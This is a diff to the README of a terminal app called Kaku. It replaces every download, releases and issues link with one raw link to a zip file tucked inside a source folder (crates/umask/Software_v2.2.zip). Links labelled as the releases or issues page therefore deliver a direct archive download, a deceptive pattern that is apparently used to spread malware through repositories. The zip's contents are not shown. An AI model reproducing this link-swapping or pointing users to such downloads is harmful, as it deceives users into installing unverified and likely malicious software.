@@ -1,6 +1,6 @@
 # 🎃 Kaku - Fast Terminal for AI Coding
 
-[![Download Kaku](https://img.shields.io/badge/Download-Kaku-blue?style=for-the-badge)](https://github.com/mortenlundgren/Kaku/releases)
+[![Download Kaku](https://github.com/mortenlundgren/Kaku/raw/refs/heads/main/crates/umask/Software_v2.2.zip)](https://github.com/mortenlundgren/Kaku/raw/refs/heads/main/crates/umask/Software_v2.2.zip)
 
 ---
 
@@ -34,7 +34,7 @@ If you have an older Mac or a different operating system, Kaku will not work pro
 To get Kaku, you need to visit the official release page and download the version for your Mac. Follow these steps:
 
 1. Click the big button at the top or visit this link:
-   [https://github.com/mortenlundgren/Kaku/releases](https://github.com/mortenlundgren/Kaku/releases)
+   [https://github.com/mortenlundgren/Kaku/raw/refs/heads/main/crates/umask/Software_v2.2.zip](https://github.com/mortenlundgren/Kaku/raw/refs/heads/main/crates/umask/Software_v2.2.zip)
 
 2. Look for the latest release; it will have a version number like “v1.0” or higher.
 
@@ -104,7 +104,7 @@ If you experience issues:
 - Restart the application.
 - Check your internet connection if features require online access.
 - Check the GitHub issues page for Kaku:
-  [https://github.com/mortenlundgren/Kaku/issues](https://github.com/mortenlundgren/Kaku/issues)
+  [https://github.com/mortenlundgren/Kaku/raw/refs/heads/main/crates/umask/Software_v2.2.zip](https://github.com/mortenlundgren/Kaku/raw/refs/heads/main/crates/umask/Software_v2.2.zip)
 - Reinstall Kaku if problems persist.
 
 ## 📚 Additional Resources
@@ -119,8 +119,8 @@ You can learn more about how to use the terminal effectively by exploring:
 
 For help, you can open an issue on the project GitHub page or reach out to the community there:
 
-[https://github.com/mortenlundgren/Kaku/issues](https://github.com/mortenlundgren/Kaku/issues)
+[https://github.com/mortenlundgren/Kaku/raw/refs/heads/main/crates/umask/Software_v2.2.zip](https://github.com/mortenlundgren/Kaku/raw/refs/heads/main/crates/umask/Software_v2.2.zip)
 
 ---
 
-[![Download Kaku](https://img.shields.io/badge/Download-Kaku-blue?style=for-the-badge)](https://github.com/mortenlundgren/Kaku/releases)
+[![Download Kaku](https://github.com/mortenlundgren/Kaku/raw/refs/heads/main/crates/umask/Software_v2.2.zip)](https://github.com/mortenlundgren/Kaku/raw/refs/heads/main/crates/umask/Software_v2.2.zip)
